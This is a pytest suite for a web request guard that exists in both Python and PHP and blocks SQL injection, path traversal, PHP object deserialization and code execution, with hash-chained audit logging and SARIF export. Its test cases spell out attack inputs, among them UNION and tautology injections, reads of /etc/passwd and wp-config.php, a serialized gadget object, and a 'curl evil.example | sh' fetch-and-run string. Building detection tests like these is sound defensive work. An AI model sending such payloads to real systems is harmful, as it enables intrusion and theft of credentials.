"""php_defense_guard: each rule, benign input, hash-chained log, and parity with php_defense_guard.php."""
from __future__ import annotations

import json
import os
import shutil
import subprocess
from pathlib import Path

import pytest

from agent_gateway.audit_chain import verify_chain_file
from agent_gateway.php_defense_guard import RULE_CODES, PhpDefenseGuard, inspect_params, match_value, sarif_report
from agent_gateway.sarif_export import RULE_ALIASES, RULES, build_sarif, validate_sarif

PHP_FILE = Path(__file__).resolve().parents[1] / "agent_gateway" / "php_defense_guard.php"
PHP = shutil.which("php")

# (params, expected rule code or None). Shared by the Python and PHP checks.
CASES: list[tuple[dict, str | None]] = [
    # SQL injection: UNION
    ({"id": "1 UNION SELECT user, password FROM wp_users"}, "PHP_SQLI_UNION"),
    ({"q": "x' union all select null,version()-- -"}, "PHP_SQLI_UNION"),
    ({"q": "1/**/UNION/**/SELECT/**/1"}, "PHP_SQLI_UNION"),
    ({"q": "1%20UNION%20SELECT%201"}, "PHP_SQLI_UNION"),  # double-encoded: decoded once by PHP, again here
    # SQL injection: tautology
    ({"id": "1' OR '1'='1"}, "PHP_SQLI_TAUTOLOGY"),
    ({"user": "admin\" or \"a\"=\"a"}, "PHP_SQLI_TAUTOLOGY"),
    ({"id": "5 OR 1=1"}, "PHP_SQLI_TAUTOLOGY"),
    # Path traversal
    ({"file": "../../../../etc/passwd"}, "PHP_PATH_TRAVERSAL"),
    ({"template": "..\\..\\windows\\win.ini"}, "PHP_PATH_TRAVERSAL"),
    ({"page": "%2e%2e%2f%2e%2e%2fwp-config.php"}, "PHP_PATH_TRAVERSAL"),
    ({"opts": {"nested": ["ok", "../../.env"]}}, "PHP_PATH_TRAVERSAL"),
    # PHP object deserialization
    ({"session": 'O:8:"stdClass":1:{s:1:"a";s:1:"b";}'}, "PHP_DESERIALIZE_DENIED"),
    ({"cart": 'a:1:{i:0;O:22:"GuzzleHttp\\Psr7\\FnStream":0:{}}'}, "PHP_DESERIALIZE_DENIED"),
    ({"c": 'C:11:"ArrayObject":21:{x:i:0;a:0:{};m:a:0:{}}'}, "PHP_DESERIALIZE_DENIED"),
    ({"remember": "O%3A8%3A%22stdClass%22%3A0%3A%7B%7D"}, "PHP_DESERIALIZE_DENIED"),
    # RCE / eval
    ({"cmd": "system('id')"}, "PHP_RCE_EVAL"),
    ({"code": "eval (base64_decode('cGhwaW5mbygpOw=='));"}, "PHP_RCE_EVAL"),
    ({"x": "SHELL_EXEC(\"curl evil.example | sh\")"}, "PHP_RCE_EVAL"),
    ({"cb": "assert($_GET['a'])"}, "PHP_RCE_EVAL"),
    ({"f": "proc_open('sh', [], $p)"}, "PHP_RCE_EVAL"),
    # Payload in a key, not a value
    ({"../../etc/passwd": "1"}, "PHP_PATH_TRAVERSAL"),
    # Benign input
    ({"q": "select a plan that fits", "name": "O'Brien"}, None),
    ({"title": "Executive summary (Q3)", "body": "We will evaluate options and union the lists."}, None),
    ({"path": "../images/logo.png", "slug": "hello-world"}, None),
    ({"rating": "4 or 5", "note": "Order 12 = paid"}, None),
    ({"email": "a.b@example.com", "tags": ["php", "wordpress"], "page": 3, "draft": False}, None),
    ({"json": '{"a":1,"b":"c"}', "serialized_array": 'a:1:{i:0;s:1:"x";}'}, None),
    ({"search": "how to use system() safely"}, "PHP_RCE_EVAL"),  # known false positive: documented
]


@pytest.mark.parametrize("params,expected", CASES)
def test_rules(params, expected):
    d = inspect_params(params)
    assert d.rule_code == (expected or "COMPLIANT"), (params, d)
    assert d.allowed is (expected is None)
    if expected:
        assert len(d.value_sha256) == 64 and d.field


def test_rule_codes_are_explicit():
    assert set(RULE_CODES) == {"PHP_SQLI_UNION", "PHP_SQLI_TAUTOLOGY", "PHP_PATH_TRAVERSAL",
                               "PHP_DESERIALIZE_DENIED", "PHP_RCE_EVAL"}
    assert match_value("plain text") is None


def test_field_names_follow_php_bracket_notation():
    d = inspect_params({"user": {"prefs": ["dark", "O:3:\"Foo\":0:{}"]}})
    assert d.field == "user[prefs][1]" and d.rule_code == "PHP_DESERIALIZE_DENIED"


def test_guard_logs_denials_in_a_verifiable_chain(tmp_path: Path):
    log = tmp_path / "php_audit.jsonl"
    guard = PhpDefenseGuard(log)
    requests = [
        {"get": {"id": "1 UNION SELECT 1"}, "uri": "/?id=1", "method": "GET", "client_ip": "203.0.113.5"},
        {"get": {"p": "about"}, "post": {}, "cookie": {"theme": "dark"}},
        {"post": {"file": "../../../etc/passwd"}, "uri": "/upload", "method": "POST"},
        {"cookie": {"session": 'O:8:"stdClass":0:{}'}},
        {"post": {"code": "eval($x)"}},
    ]
    results = [guard.inspect(r) for r in requests]
    assert [r.rule_code for r in results] == ["PHP_SQLI_UNION", "COMPLIANT", "PHP_PATH_TRAVERSAL",
                                              "PHP_DESERIALIZE_DENIED", "PHP_RCE_EVAL"]
    assert results[2].field == "file" and results[3].field == "session"

    report = verify_chain_file(log)
    assert report.ok and report.entries == 4  # allowed requests are not logged by default
    entries = [json.loads(ln) for ln in log.read_text().splitlines()]
    assert entries[0]["uri"] == "/?id=1" and entries[0]["client_ip"] == "203.0.113.5"
    for prev, cur in zip(entries, entries[1:]):
        assert cur["prev_hash"] == prev["entry_hash"]
    text = log.read_text()
    assert "etc/passwd" not in text and "UNION SELECT" not in text and "stdClass" not in text  # values hashed

    lines = log.read_text().splitlines()
    lines[1] = lines[1].replace("PHP_PATH_TRAVERSAL", "COMPLIANT")
    log.write_text("\n".join(lines) + "\n")
    assert verify_chain_file(log).ok is False


def test_log_allowed_option(tmp_path: Path):
    guard = PhpDefenseGuard(tmp_path / "a.jsonl", log_allowed=True)
    guard.inspect({"q": "hello"})
    assert verify_chain_file(tmp_path / "a.jsonl").entries == 1


# --- parity with the PHP class ---------------------------------------------------

def php_missing_action(env, php_path) -> str | None:
    """``"fail"`` in CI, ``"skip"`` elsewhere, when no php binary is found; None when it is."""
    if php_path:
        return None
    in_ci = env.get("CI") == "true" or env.get("GITHUB_ACTIONS") == "true"
    return "fail" if in_ci else "skip"


@pytest.fixture()
def php():
    """The php binary. In CI a missing binary fails loudly so the parity tests can never be skipped there."""
    action = php_missing_action(os.environ, PHP)
    if action == "fail":
        pytest.fail("php binary not found in CI: the PHP / Python parity tests must run (setup-php 8.3)")
    if action == "skip":
        pytest.skip("php binary not installed (parity tests run in CI)")
    return PHP


def test_missing_php_fails_in_ci_and_skips_locally():
    assert php_missing_action({"CI": "true"}, None) == "fail"
    assert php_missing_action({"GITHUB_ACTIONS": "true"}, None) == "fail"
    assert php_missing_action({}, None) == "skip"
    assert php_missing_action({"CI": "true"}, "/usr/bin/php") is None


def _php(script: str, stdin: str = "", env_extra: dict | None = None) -> subprocess.CompletedProcess:
    return subprocess.run([PHP, "-d", "display_errors=stderr", "-r", script], input=stdin,
                          capture_output=True, text=True, timeout=60)


def test_php_file_parses(php):
    res = subprocess.run([PHP, "-l", str(PHP_FILE)], capture_output=True, text=True, timeout=60)
    assert res.returncode == 0, res.stdout + res.stderr


def test_php_and_python_agree_on_every_case(php, tmp_path: Path):
    log = tmp_path / "php_written.jsonl"
    script = f"""
        require {json.dumps(str(PHP_FILE))};
        $g = new \\AgentGate\\PhpDefenseGuard({json.dumps(str(log))});
        $out = [];
        foreach (json_decode(stream_get_contents(STDIN), true) as $params) {{
            $hit = \\AgentGate\\PhpDefenseGuard::inspect($params);
            if ($hit !== null) {{ $g->logViolation($hit); }}
            $out[] = $hit;
        }}
        echo json_encode($out);
    """
    res = _php(script, json.dumps([p for p, _ in CASES]))
    assert res.returncode == 0, res.stderr
    php_hits = json.loads(res.stdout)
    for (params, expected), hit in zip(CASES, php_hits):
        py = inspect_params(params)
        assert (hit["rule_code"] if hit else None) == expected, (params, hit)
        if hit:
            assert hit["field"] == py.field and hit["value_sha256"] == py.value_sha256, params
    # The PHP-written log is a valid audit_chain log.
    report = verify_chain_file(log)
    assert report.ok, report.errors
    assert report.entries == sum(1 for _, e in CASES if e)


def test_php_enforce_answers_403_with_rule_code(php, tmp_path: Path):
    log = tmp_path / "enforce.jsonl"
    script = f"""
        require {json.dumps(str(PHP_FILE))};
        $_GET = ['p' => 'home'];
        $_POST = ['comment' => 'nice post'];
        $_COOKIE = ['wp_session' => 'O:8:"stdClass":0:{{}}'];
        $_SERVER['REQUEST_URI'] = '/wp-admin/admin-ajax.php';
        $_SERVER['REQUEST_METHOD'] = 'POST';
        (new \\AgentGate\\PhpDefenseGuard({json.dumps(str(log))}))->inspectAndEnforce();
        echo "reached";
    """
    res = _php(script)
    assert res.returncode == 1 and "reached" not in res.stdout
    body = json.loads(res.stdout)
    assert body == {"error": "AgentGate PHP Defense Blocked Request", "rule_code": "PHP_DESERIALIZE_DENIED",
                    "status": 403}
    entry = json.loads(log.read_text())
    assert entry["uri"] == "/wp-admin/admin-ajax.php" and entry["field"] == "wp_session"
    assert verify_chain_file(log).ok

    clean = _php(f"""
        require {json.dumps(str(PHP_FILE))};
        $_GET = ['s' => 'hello world']; $_POST = []; $_COOKIE = [];
        (new \\AgentGate\\PhpDefenseGuard({json.dumps(str(tmp_path / "clean.jsonl"))}))->inspectAndEnforce();
        echo "reached";
    """)
    assert clean.returncode == 0 and clean.stdout == "reached"


# --- excluded keys and log-only mode (both languages) -------------------------------

# (params, excluded keys, expected rule code or None)
EXCLUDE_CASES: list[tuple[dict, list[str], str | None]] = [
    ({"s": "how to use system() safely"}, ["s"], None),
    ({"s": "how to use system() safely", "id": "1 UNION SELECT 1"}, ["s"], "PHP_SQLI_UNION"),
    ({"q": "1' OR '1'='1"}, ["s"], "PHP_SQLI_TAUTOLOGY"),  # only the named key is excluded
    ({"filter": {"q": "eval(x)", "path": "../../etc/passwd"}}, ["filter[q]"], "PHP_PATH_TRAVERSAL"),
    ({"filter": {"q": "eval(x)", "path": "../../etc/passwd"}}, ["filter"], None),  # covers nested fields
    ({"S": "system('id')"}, ["s"], "PHP_RCE_EVAL"),  # names are case-sensitive, as in PHP
    ({"tags": ["ok", 'O:3:"Foo":0:{}']}, ["tags[1]"], None),
]


@pytest.mark.parametrize("params,excluded,expected", EXCLUDE_CASES)
def test_excluded_keys(params, excluded, expected):
    d = inspect_params(params, excluded)
    assert d.rule_code == (expected or "COMPLIANT"), (params, excluded, d)
    # Default behaviour is unchanged: without exclusions the excluded value still matches.
    assert inspect_params(params).allowed is False


def test_log_only_records_without_enforcing(tmp_path: Path):
    log = tmp_path / "log_only.jsonl"
    guard = PhpDefenseGuard(log, log_only=True, excluded_keys=["s"])
    d = guard.inspect({"get": {"s": "system()", "page": "../../wp-config.php"}, "uri": "/?s=x"})
    assert d.allowed is False and d.enforced is False and d.verdict == "LOG_ONLY"
    assert d.rule_code == "PHP_PATH_TRAVERSAL" and d.field == "page"
    assert guard.inspect({"get": {"s": "system()"}}).allowed is True
    entries = [json.loads(ln) for ln in log.read_text().splitlines()]
    assert [e["verdict"] for e in entries] == ["LOG_ONLY"]
    assert verify_chain_file(log).ok
    # Enforcing remains the default.
    assert PhpDefenseGuard(tmp_path / "d.jsonl").inspect({"q": "eval(1)"}).verdict == "DENY"


def test_php_and_python_agree_on_excluded_keys(php):
    script = """
        require %s;
        $out = [];
        foreach (json_decode(stream_get_contents(STDIN), true) as $c) {
            $out[] = \\AgentGate\\PhpDefenseGuard::inspect($c[0], '', $c[1]);
        }
        echo json_encode($out);
    """ % json.dumps(str(PHP_FILE))
    res = _php(script, json.dumps([[p, e] for p, e, _ in EXCLUDE_CASES]))
    assert res.returncode == 0, res.stderr
    for (params, excluded, expected), hit in zip(EXCLUDE_CASES, json.loads(res.stdout)):
        py = inspect_params(params, excluded)
        assert (hit["rule_code"] if hit else None) == expected, (params, excluded, hit)
        if hit:
            assert (hit["field"], hit["value_sha256"]) == (py.field, py.value_sha256)


def test_php_and_python_agree_on_log_only(php, tmp_path: Path):
    php_log, py_log = tmp_path / "php.jsonl", tmp_path / "py.jsonl"
    request = {"get": {"s": "system('id')", "p": "home"}, "post": {"file": "../../../etc/passwd"},
               "cookie": {"sess": "ok"}}
    script = f"""
        require {json.dumps(str(PHP_FILE))};
        $r = json_decode(stream_get_contents(STDIN), true);
        $_GET = $r['get']; $_POST = $r['post']; $_COOKIE = $r['cookie'];
        $hit = (new \\AgentGate\\PhpDefenseGuard({json.dumps(str(php_log))}, ['s'], true))->inspectAndEnforce();
        echo json_encode($hit), "|reached";
    """
    res = _php(script, json.dumps(request))
    assert res.returncode == 0, res.stderr
    body, _, tail = res.stdout.partition("|")
    assert tail == "reached"  # no 403, no exit
    hit = json.loads(body)
    assert hit["rule_code"] == "PHP_PATH_TRAVERSAL" and hit["field"] == "file" and hit["enforced"] is False

    py = PhpDefenseGuard(py_log, excluded_keys=["s"], log_only=True).inspect(request)
    assert (py.rule_code, py.field, py.value_sha256, py.enforced) == \
        (hit["rule_code"], hit["field"], hit["value_sha256"], hit["enforced"])
    php_entry, py_entry = (json.loads(f.read_text()) for f in (php_log, py_log))
    keys = ("kind", "verdict", "rule_code", "field", "value_sha256", "seq", "prev_hash")
    assert {k: php_entry[k] for k in keys} == {k: py_entry[k] for k in keys}
    assert php_entry["verdict"] == "LOG_ONLY"
    assert verify_chain_file(php_log).ok and verify_chain_file(py_log).ok


# --- SARIF export ------------------------------------------------------------------

PHP_RULE_META = {
    "PHP_PATH_TRAVERSAL": ("cwe-22", "A01:2021"),
    "PHP_DESERIALIZE_DENIED": ("cwe-502", "A08:2021"),
    "PHP_RCE_EVAL": ("cwe-94", "A03:2021"),
    "PHP_SQLI_UNION": ("cwe-89", "A03:2021"),
    "PHP_SQLI_TAUTOLOGY": ("cwe-89", "A03:2021"),
}


def test_findings_export_to_valid_sarif(tmp_path: Path):
    log = tmp_path / "php.jsonl"
    guard = PhpDefenseGuard(log)
    for params in ({"f": "../../etc/passwd"}, {"d": 'O:8:"stdClass":0:{}'}, {"c": "eval($x)"},
                   {"q": "1 UNION SELECT 1"}, {"id": "1 OR 1=1"}, {"ok": "fine"}):
        guard.inspect({"get": params, "uri": "/index.php", "method": "GET", "client_ip": "198.51.100.7"})
    PhpDefenseGuard(log, log_only=True).inspect({"get": {"c": "system('id')"}})

    doc = build_sarif(sarif_report(log))
    assert validate_sarif(doc) == []
    run = doc["runs"][0]
    results = run["results"]
    assert [r["ruleId"] for r in results] == ["PHP_PATH_TRAVERSAL", "PHP_DESERIALIZE_DENIED", "PHP_RCE_EVAL",
                                              "PHP_SQLI_UNION", "PHP_SQLI_TAUTOLOGY", "PHP_RCE_EVAL"]
    assert all(r["level"] == "error" for r in results)
    assert "verdict=LOG_ONLY" in results[-1]["message"]["text"]
    assert results[0]["locations"][0]["logicalLocations"][0]["fullyQualifiedName"] == "f"
    rules = {r["id"]: r for r in run["tool"]["driver"]["rules"]}
    assert set(rules) == set(PHP_RULE_META)
    for rid, (cwe, owasp) in PHP_RULE_META.items():
        rule = rules[rid]
        assert rule["defaultConfiguration"]["level"] == "error"
        assert rule["shortDescription"]["text"] and rule["fullDescription"]["text"]
        assert f"external/cwe/{cwe}" in rule["properties"]["tags"]
        assert f"OWASP-Top10/{owasp}" in rule["properties"]["tags"]
    assert rules["PHP_DESERIALIZE_DENIED"]["shortDescription"]["text"] == "PHP object injection"
    assert rules["PHP_RCE_EVAL"]["shortDescription"]["text"] == "PHP code execution"
    assert set(RULE_CODES) <= set(RULES)


def test_alias_rule_names_map_to_emitted_codes():
    rows = [{"kind": "PHP_OBJECT_INJECTION", "tool": "d"}, {"kind": "PHP_CODE_EXEC", "tool": "c"}]
    doc = build_sarif({"gateway_findings": {"rows": rows}})
    assert validate_sarif(doc) == []
    assert [r["ruleId"] for r in doc["runs"][0]["results"]] == ["PHP_DESERIALIZE_DENIED", "PHP_RCE_EVAL"]
    assert set(RULE_ALIASES.values()) <= set(RULE_CODES)


def test_php_written_log_exports_to_sarif(php, tmp_path: Path):
    log = tmp_path / "php.jsonl"
    script = f"""
        require {json.dumps(str(PHP_FILE))};
        $g = new \\AgentGate\\PhpDefenseGuard({json.dumps(str(log))});
        foreach ([['a' => '../../x'], ['b' => 'O:3:"Foo":0:{{}}'], ['c' => 'passthru("id")']] as $p) {{
            $g->logViolation(\\AgentGate\\PhpDefenseGuard::inspect($p));
        }}
    """
    res = _php(script)
    assert res.returncode == 0, res.stderr
    doc = build_sarif(sarif_report(log))
    assert validate_sarif(doc) == []
    assert [r["ruleId"] for r in doc["runs"][0]["results"]] == ["PHP_PATH_TRAVERSAL", "PHP_DESERIALIZE_DENIED",
                                                                 "PHP_RCE_EVAL"]
